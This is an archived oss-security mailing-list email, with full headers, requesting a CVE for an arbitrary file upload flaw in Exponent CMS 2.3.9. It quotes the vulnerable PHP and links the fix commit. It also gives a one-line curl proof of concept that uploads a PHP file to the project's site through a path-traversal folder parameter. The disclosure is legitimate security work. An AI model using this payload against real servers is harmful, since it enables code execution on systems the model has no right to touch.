X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2979" "Wednesday" "21" "September" "2016" "08:10:39" "+0800" "Carl Peng" "felixk3y@gmail.com" "<CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>" "78" "[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=" nil nil nil "9" "2016092100:10:39" "[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=" (number mark "U       felixk3y@gma Sep 21   78/2979  " thread-indent "\"[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25962 invoked by uid 550); 21 Sep 2016 00:46:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1948 invoked from network); 21 Sep 2016 00:10:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=Q5jWkHfmPDX3COZuWBb42ph2qVW6qLjwtsPdj8jjbQo=;
        b=kE9NPevkjUGIkT12Olvmy+HSjyYxqJu3Gt+drJVoMfpGDIuPeZ3/2W7tqzdTnpZy34
         d3TN+PQZCePHkKLWk8Su+vG/cWVfw95glJrIkVpgipWc5a3oVmL8kPRaVXTmXE2YTFgB
         ANmRDmJSXmVSs3mRXSwswyNkowB298eYzhg0nwkijViG18dTEVZL66/JF54RZwUQNqTH
         A9lPizdBEtq9I6Do9RvNwt/jfBG3BBMnQ512DpQZ5ReuIlTX/uXhoHuc4J/liEMxumpl
         bpGcHdXY1mi8BeMwmlFzFkyIOc5EagqnBg8kG9p8YT72A59aMJMdN/+2lOqAvlM1tDBT
         tLSg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=Q5jWkHfmPDX3COZuWBb42ph2qVW6qLjwtsPdj8jjbQo=;
        b=BCjzJy9aRuZckjSDSq0CEdBFe1kdyHNcL++oWRwCjDhbnkYZQ7O76fUj2ZSkgEfLzW
         7STYHK8siGBtCW+3pKB3sP/8r7pgaeicf8jz+pRXZaGFwM4zmPE2ChtqmOiArMX4XJaw
         /pNK7mMiv4Hs1ZF1Zfg/h8W8gOoOYiQkpQJFsbMy2544mbLwWvjNIm+ookKSRCrUDKwB
         k3/mIA8Xt6I6fvcChkpOu7QFhVKuFolIxgflF2LByrbsLTwJ7gsoa13H60YY0Hw+rc1Q
         tKD6VWpizDXXlmEScRIiB8e6IOkHmDxLtBpe6+lVHXI6EcffsEB/stiW/Ggw1Ociw2I6
         fMQQ==
X-Gm-Message-State: AE9vXwMnnanT8FQQO6Vu+qolKdhFRA0jP7mAjGWuh54paFsQjKWkqrfDPJXGDjKOTOWsOw2xaMmW0fvlj9LZlw==
X-Received: by 10.194.96.136 with SMTP id ds8mr29938704wjb.3.1474416640340;
 Tue, 20 Sep 2016 17:10:40 -0700 (PDT)
MIME-Version: 1.0
From: Carl Peng <felixk3y@gmail.com>
Date: Wed, 21 Sep 2016 08:10:39 +0800
Message-ID: <CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=089e0103efb2193871053cf960e5
Subject: [oss-security] =?UTF-8?Q?CVE_request=EF=BC=9AExponent_CMS_2=2E3=2E9_Arbitrary_File_Uplo?=
	=?UTF-8?Q?ad_vulnerability_in_expFile=2Ephp?=

--089e0103efb2193871053cf960e5
Content-Type: text/plain; charset=UTF-8

Hi, I reported the following Arbitrary File Upload vulnerability to the
ExponentCMS team on Sep 13, 2016:
vulnerability:
https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/controllers/fileController.php#L570-L592
```
if (!empty($this->params['folder']) || (defined('QUICK_UPLOAD_FOLDER') &&
QUICK_UPLOAD_FOLDER != '' && QUICK_UPLOAD_FOLDER != 0)) {
            // prevent attempt to place file somewhere other than /files
folder
            if (!empty($this->params['folder']) &&
strpos($this->params['folder'], '..') !== false) {
                $ar = new expAjaxReply(300, gt("File was not uploaded!"));
                $ar->send();
            }
            if (SITE_FILE_MANAGER == 'picker') {
                $quikFolder = !empty($this->params['folder']) ?
$this->params['folder'] :QUICK_UPLOAD_FOLDER;
                $destDir = null;
            } elseif (SITE_FILE_MANAGER == 'elfinder') {
                $quikFolder = null;
                $destDir = UPLOAD_DIRECTORY_RELATIVE .
(!empty($this->params['folder']) ? $this->params['folder']
:QUICK_UPLOAD_FOLDER) . '/';
                // create folder if non-existant
                expFile::makeDirectory($destDir);
            }
        } else {
            $quikFolder = null;
            $destDir = null;
        }
        //extensive suitability check before doing anything with the file...
        if (isset($_SERVER['HTTP_X_FILE_NAME'])) {  //HTML5 XHR upload
            $file =
expFile::fileXHRUpload($_SERVER['HTTP_X_FILE_NAME'],false,false,null,$destDir,intval(QUICK_UPLOAD_WIDTH));
 //here File Upload vulnerability
            $file->poster = $user->id;
```
the "folder"  and "$_SERVER['HTTP_X_FILE_NAME']", the two parameters may be
submitted by the user

expFile::fileXHRUpload():
https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/models/expFile.php#L526
```
$_destFile = ($_destFile == null) ? self::fixName($fileName) : $_destFile;
//"fileName" parameter may be submitted by the user
//...
$maxwidth = intval($_max_width);
if (!empty($maxwidth)) {
..///
} else {
    file_put_contents($_destFullPath, file_get_contents('php://input',
'r')); // line 572
}

Proof of concept:
curl -H "X-File-Name: e.php" -d
"controller=file&action=quickUpload&code=<?php
phpinfo();?>&folder=../install" http://www.exponentcms.org/index.php

http://www.exponentcms.org/install/e.php


And Now, This  vulnerability have been fixed.
https://exponentcms.lighthouseapp.com/projects/61783/changesets/355702a9835cf527796c9d469a82258b7639148a
https://github.com/exponentcms/exponent-cms/commit/355702a9835cf527796c9d469a82258b7639148a

This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
to request a CVE for this issue (if not done so).

Thank you.
---------------------------------http://www.silence.com.cn
penghua#silence.com.cn
PKAV Team

--089e0103efb2193871053cf960e5--
